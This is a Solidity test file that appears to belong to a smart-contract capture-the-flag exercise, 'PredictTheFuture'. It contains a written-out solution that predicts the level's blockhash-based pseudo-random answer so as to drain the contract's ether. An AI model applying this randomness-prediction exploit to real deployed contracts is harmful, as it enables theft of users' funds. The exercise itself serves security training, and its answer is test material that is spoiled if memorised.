// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/06_PredictTheFuture/PredictTheFuture.sol";

// forge test --match-contract PredictTheFutureTest -vvvv
contract PredictTheFutureTest is BaseTest {
    PredictTheFuture instance;

    function setUp() public override {
        super.setUp();
        instance = new PredictTheFuture{value: 0.01 ether}();

        vm.roll(143242);
    }

    function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */

        vm.roll(block.number + 1);
        uint8 guess = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 10);
        instance.setGuess{value: 0.01 ether}(guess);

        vm.roll(block.number + 2);
        instance.solution();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}